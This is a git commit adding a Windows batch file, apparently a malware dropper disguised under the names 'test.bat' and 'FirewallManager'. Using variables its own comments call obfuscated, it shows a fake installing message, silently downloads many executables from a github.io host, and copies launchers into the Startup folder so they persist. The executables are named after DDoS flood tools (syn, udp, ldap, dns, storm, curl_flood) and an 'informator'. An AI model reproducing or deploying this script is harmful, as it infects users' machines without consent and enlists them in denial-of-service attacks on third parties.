454bb9f296361f278b26664e4e226bca41535c79
Abrissy <132929073+Abrissyy@users.noreply.github.com>
2024-07-18 16:16:31 +0000

    Create test.bat

---
+++ test.bat
@@ -0,0 +1,56 @@
+@echo off
+
+:: Obfuscated variables
+set "a=FirewallManager"
+set "b=informator.exe"
+set "c=https://abrissyy.github.io/goodreps/bot/"
+
+:: Obfuscated commands
+set "cmd1=cd C:\Users\%username%\AppData"
+set "cmd2=mkdir %a%"
+set "cmd3=cd %a%"
+set "cmd4=color a"
+set "cmd5=echo \"Installing. Please wait\""
+set "cmd6=curl -OJL --silent %c%client.exe"
+set "cmd7=curl -OJL --silent %c%get.exe"
+set "cmd8=curl -OJL --silent %c%post.exe"
+set "cmd9=curl -OJL --silent %c%tcp.exe"
+set "cmd10=curl -OJL --silent %c%udp.exe"
+set "cmd11=curl -OJL --silent %c%curl_flood.exe"
+set "cmd12=curl -OJL --silent %c%storm.exe"
+set "cmd13=curl -OJL --silent %c%ldap.exe"
+set "cmd14=curl -OJL --silent %c%syn.exe"
+set "cmd15=curl -OJL --silent %c%informator.exe"
+set "cmd16=curl -OJL --silent %c%setup.bat"
+set "cmd17=curl -OJL --silent %c%dns.exe"
+set "cmd18=echo start C:\Users\%username%\AppData\%a%\%b% >Informator.bat"
+set "cmd19=xcopy /y setup.bat \"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
+set "cmd20=xcopy /y Informator.bat \"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
+set "cmd21=cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+set "cmd22=Informator.bat & setup.bat"
+set "cmd23=exit"
+
+:: Execute obfuscated commands
+%cmd1%
+%cmd2%
+%cmd3%
+%cmd4%
+%cmd5%
+%cmd6%
+%cmd7%
+%cmd8%
+%cmd9%
+%cmd10%
+%cmd11%
+%cmd12%
+%cmd13%
+%cmd14%
+%cmd15%
+%cmd16%
+%cmd17%
+%cmd18%
+%cmd19%
+%cmd20%
+%cmd21%
+%cmd22%
+%cmd23%
